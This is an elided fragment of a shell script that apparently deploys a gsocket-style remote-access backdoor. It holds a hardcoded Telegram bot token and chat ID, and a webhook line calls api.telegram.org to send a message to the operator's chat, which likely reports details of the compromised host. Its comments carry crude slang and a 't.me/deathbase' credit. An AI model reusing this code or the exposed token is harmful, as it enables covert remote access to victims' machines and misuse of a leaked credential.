...
# GS_TG_TOKEN=
#       - Telegram Bot ID, = TOKEN LU MEMEK
# GS_TG_CHATID=
#       - Telegram Chat ID, =ID LU
# GS_DISCORD_KEY=
#       - Discord API key, ="#"
# GS_WEBHOOK_KEY=
...
### Telegram
GS_TG_TOKEN="8509655361:AAEfvZVAX1zoAFozqa2egJA5jfyPnC7dy44"
GS_TG_CHATID="-5248188703"
[[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
	...
	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&text=${msg}")
}
...
# t.me/deathbase script not for sale
	unset OSARCH
	unset SRC_PKG
